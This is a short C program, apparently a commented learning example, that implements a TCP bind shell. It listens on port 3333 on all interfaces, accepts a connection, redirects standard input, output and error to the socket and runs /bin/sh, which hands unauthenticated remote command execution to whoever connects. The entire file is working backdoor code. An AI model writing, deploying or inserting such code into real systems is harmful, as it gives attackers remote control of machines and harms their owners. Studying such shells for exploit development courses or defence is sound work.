#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
    int client_file_descripter, sock_file_descripter;
    int network_port = 3333;//tcp port that shell will bind to
    struct sockaddr_in mysockaddr;

    sock_file_descripter = socket(AF_INET, SOCK_STREAM, 0);

    mysockaddr.sin_family = AF_INET; //2, TCP protocol
    mysockaddr.sin_port = htons(network_port);//tcp port to listen on
    mysockaddr.sin_addr.s_addr = INADDR_ANY;//0, bindshell will listen on any address

    bind(sock_file_descripter, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

    listen(sock_file_descripter, 0);

    client_file_descripter = accept(sock_file_descripter, NULL, NULL);

    dup2(client_file_descripter, 0);
    dup2(client_file_descripter, 1);
    dup2(client_file_descripter, 2);

    execve("/bin/sh", NULL, NULL);//Execute shell command
    return 0;
}
